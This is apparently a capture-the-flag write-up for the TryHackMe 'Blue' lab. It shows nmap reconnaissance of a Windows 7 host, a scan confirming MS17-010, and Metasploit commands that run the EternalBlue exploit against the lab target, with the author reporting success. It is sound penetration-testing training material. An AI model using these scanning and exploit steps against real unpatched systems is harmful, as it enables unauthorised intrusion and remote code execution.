# Blue

## Preparation

Added the IP to /etc/hosts as blue.thm

## Recon

Scanning for open ports.
```
nmap -p- -T4 -oA recon/nmap/ports blue.thm
...
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49158/tcp open  unknown
```

Identifying OS
```
ping -c 1 blue.thm
PING blue.thm (10.10.179.113) 56(84) bytes of data.
64 bytes from blue.thm (10.10.179.113): icmp_seq=1 ttl=125 time=247 ms
```

It is likely Windows, checked TTLs against [this blog](https://subinsb.com/default-device-ttl-values/). Service Pack and Version unknown.

Identfying services and OS
```
nmap -p 135,139,445,3389,49152,49153,49154,49158 -A -oA recon/nmap/fingerprinting blue.thm
...
PORT      STATE SERVICE            VERSION
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  ssl/ms-wbt-server?
|_ssl-date: 2020-06-01T06:11:35+00:00; 0s from scanner time.
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  msrpc              Microsoft Windows RPC
49154/tcp open  msrpc              Microsoft Windows RPC
49158/tcp open  msrpc              Microsoft Windows RPC
Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 1h15m00s, deviation: 2h30m00s, median: 0s
|_nbstat: NetBIOS name: JON-PC, NetBIOS user: <unknown>, NetBIOS MAC: 02:d6:4c:88:fa:88 (unknown)
| smb-os-discovery: 
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: Jon-PC
|   NetBIOS computer name: JON-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2020-06-01T01:11:22-05:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-06-01T06:11:22
|_  start_date: 2020-06-01T04:54:31
```

Windows 7, checking MS17-010
```
nmap --script=smb-vuln-ms17-010.nse -p 445 -oN recon/nmap/ms17-010.nmap blue.thm
...
PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|_      https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
```

Attempting to exploit with MSF. Exploit successful.
```
...
221  search type:exploit ms17-010
222  use exploit/windows/smb/ms17_010_eternalblue
223  options
224  setg RHOSTS 10.10.179.113
225  exploit
...
```